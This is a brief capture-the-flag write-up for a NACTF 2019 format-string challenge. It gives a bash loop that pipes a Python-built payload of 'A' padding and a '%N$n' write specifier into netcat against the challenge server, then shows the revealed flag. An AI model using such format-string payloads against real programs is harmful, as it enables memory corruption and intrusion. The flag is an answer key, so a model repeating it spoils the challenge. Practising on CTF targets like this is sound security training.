#### Challenge:

printf can do more than just read memory... can you change the variable? `nc shell.2019.nactf.com 31560` [format-1.c](./format-1.c ":ignore") [format-1](./format-1 ":ignore")

---

#### Solution:

```bash
for i in `seq 10 25`; do
    python -c  "print \"A\" * 42 + \"%$i\$n\" " | nc shell.2019.nactf.com 31560;
done
```

---

<details><summary>FLAG:</summary>

```
nactf{Pr1ntF_wr1t3s_t0o_rZFCUmba}
```

</details>
